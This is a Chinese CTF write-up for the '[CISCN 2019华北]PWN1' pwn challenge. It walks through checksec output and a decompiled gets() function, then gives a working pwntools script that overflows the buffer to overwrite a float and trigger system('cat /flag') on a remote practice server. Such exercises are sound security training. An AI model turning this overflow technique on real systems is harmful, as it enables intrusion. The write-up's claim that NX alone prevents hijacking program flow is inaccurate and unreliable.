---
title: "pwn"
lastmod: 2026-06-19T00:26:58+08:00
draft: false
---
## P100[CISCN 2019华北]PWN1
下载附件下来看一下
```
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```
只开了nx
代表我们不能劫持程序流，只能利用原有的程序
```c
int func()
{
  _BYTE v1[44]; // [rsp+0h] [rbp-30h] BYREF
  float v2; // [rsp+2Ch] [rbp-4h]

  v2 = 0.0;
  puts("Let's guess the number.");
  gets(v1);
  if ( v2 == 11.28125 )
    return system("cat /flag");
  else
    return puts("Its value should be 11.28125");
}
```
好像不需要劫持程序流，直接写完v1然后写v2就行了
注意一下不能直接在p32里面写11.28125，需要写对应的16进制的值，不能帮你转换
![[Pasted image 20260615090615.png]]
去程序里面找到相应的值，然后替换一下就行
```python
from pwn import *

# context(os="linux", arch="amd64", log_level="debug")

io = remote("node4.anna.nssctf.cn", 24219)

# io = process(".\[CISCN 2019华北]PWN1")

payload = b'A' * 44 + p64(0x41348000)

io.sendline(payload)#send不会输出换行符，只能用sendline

io.interactive()
```

